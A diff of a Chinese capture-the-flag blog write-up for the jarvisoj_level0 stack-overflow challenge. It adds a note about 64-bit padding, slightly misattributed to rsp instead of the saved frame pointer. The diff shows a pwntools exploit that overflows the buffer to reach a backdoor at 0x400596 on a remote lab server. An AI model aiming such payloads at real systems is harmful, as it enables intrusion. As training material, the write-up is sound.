@@ -224,6 +224,7 @@
 <p>buf占用空间小于read函数可写入数据，可以使用栈溢出</p>
 <p>找到后门函数地址</p>
 <p><img src="/images/jarvisoj_level0/Snipaste_2023-01-22_15-07-34-16743713614164.png"></p>
+<p>由于是64位程序，rsp应该占用8字节</p>
 <p>可写出exp</p>
 <p>from pwn import *</p>
 <p>io &#x3D; remote(‘node4.buuoj.cn’, 28712)<br>payload &#x3D; b’a‘*（0x80+8）+ p64(0x400596)<br>io.sendline(payload)<br>io.interactive() </p>
